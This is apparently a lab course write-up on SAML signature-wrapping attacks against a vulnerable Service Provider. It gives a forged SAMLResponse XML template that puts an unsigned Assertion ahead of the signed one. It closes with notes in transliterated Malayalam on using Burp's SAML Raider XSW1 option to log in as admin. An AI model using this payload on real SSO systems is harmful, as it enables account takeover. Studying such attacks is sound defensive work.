## Introduction
-->This course details the exploitation of an insecure SAML implementation that allows a malicious user to become another user by tampering with the SAMLResponse.

## SAML Wrapping
-->When the Identity Provider sends the SAMLResponse to the Service Provider, the Service Provider needs to do two things:

1.  Verify the signature
2.  Get the information from the message
-->SAML Wrapping attacks are relying on the fact that step #2 may not be parsing the XML message in the same way as step #1.
-->If we take a simplified version of the SAMLResponse:
```xml
	<samlp:Response>
	    <Assertion ID="_9eb16cd0-5fd9-0135-899f-0242ac110029">
	      <ds:Signature>
	        <ds:SignedInfo>
	          <ds:Reference URI="#_9eb16cd0-5fd9-0135-899f-0242ac110029">
	          </ds:Reference>
	        </ds:SignedInfo>
	        <ds:SignatureValue>...</ds:SignatureValue>
	      </ds:Signature>
	      <Subject>
	        <NameID>louis@example.org</NameID>
	      </Subject>
	    </Assertion>
	  </samlp:Response>
```
-->We can see that there is a Reference in the SignedInfo pointing to the Assertion that was signed. Implementations should rely on this reference to fetch the NameID.
-->The issue here comes from the fact that when retrieving the NameID, the SAML library or the application leveraging the SAML library may not return the same NameID as the one it verified.

## The attack
-->For this challenge, the application will use the first NameID it can find in the SAMLResponse. Therefore you will need to craft a SAMLResponse that looks something like:
```xml
	<samlp:Response>
	    <Assertion ID="whatever_you_want">
	      <Subject>
	        <NameID>hacker@example.org</NameID>
	      </Subject>
	    </Assertion>
	    <Assertion ID="_9eb16cd0-5fd9-0135-899f-0242ac110029">
	      <ds:Signature>
	        <ds:SignedInfo>
	          <ds:Reference URI="#_9eb16cd0-5fd9-0135-899f-0242ac110029">
	          </ds:Reference>
	        </ds:SignedInfo>
	        <ds:SignatureValue>...</ds:SignatureValue>
	      </ds:Signature>
	      <Subject>
	        <NameID>louis@example.org</NameID>
	      </Subject>
	    </Assertion>
	  </samlp:Response>
```
-->You will obviously need to base this SAMLResponse from the initial SAMLResponse and most fields not showed in the XML above should be kept

## Conclusion
-->This exercise showed you how to exploit a vulnerability in a SAML implementation impacting the Service Provider. With more and more enterprises using SSO, it's essential to ensure that this kind of mistakes gets detected and fixed before they get exploited.

# Video Explanation
-->saml response namal burp il intercept chyanam enit saml raider extension intercept il on aakuka apol athinte base64 decoded form il namuk saml response kanikum ariyalo.enit avide namude username thazhe search chyuka.apol kanikum. ini mukalil saml raider extensions inte korach buttons oke kanan patum.so athil xss attacks inte thazhe aayi XSW1 enn button click chyth select chyuka enit apply XSW enna button select chyuka.ipol namuk oru username match in pakaram rand namude usernames response il kanikum.so athile oro username um individual ayi test chyanam.so adyathe namude username mati admin@libcurl.so ekoduth forward adichapol namuk admin aayi maran pati ok
-->ivide signature maryathak application nokathatho agnane entho aan.theory part nokiya mathi ok